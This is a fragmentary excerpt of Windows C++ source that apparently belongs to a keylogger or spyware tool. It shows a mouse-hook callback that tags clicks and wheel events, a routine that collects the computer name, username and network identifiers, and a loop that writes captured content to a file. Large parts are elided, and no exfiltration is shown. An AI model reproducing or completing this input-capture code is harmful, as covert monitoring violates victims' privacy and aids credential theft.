...
static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	...
	if (nCode == HC_ACTION && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN))
	{
		...
		if (!(wParam ^ WM_LBUTTONDOWN)) // left click
			message = "|<M|";
		else if (!(wParam ^ WM_RBUTTONDOWN)) // right click
			message = "|M>|";
		else if (!(wParam ^ WM_MBUTTONDOWN)) // middle click
			message = "|M|";
		// else if (wParam == WM_MOUSEMOVE) // mouse move
		// 	message = "|MOVE|";
		else if (wParam == WM_MOUSEWHEEL) // mouse wheel
			message = "|WHEEL|";
...
static std::string StartString()
{
	...
	if (GetComputerName(pcname, &pcname_len))
	{
		...
		startString.append("Impossibile ottenere il nome del computer.");
	// User Name
	startString.append("\nUsername: ");
	TCHAR username[256];
	...
	if (GetUserName(username, &username_len))
	{
		...
		startString.append("Impossibile ottenere il nome utente.");
	// IP and MAC Address
...
static void timeCheck()
{
	...
	while (true)
	{
		...
		{
			outputFile << tmp; // writing the content of the file
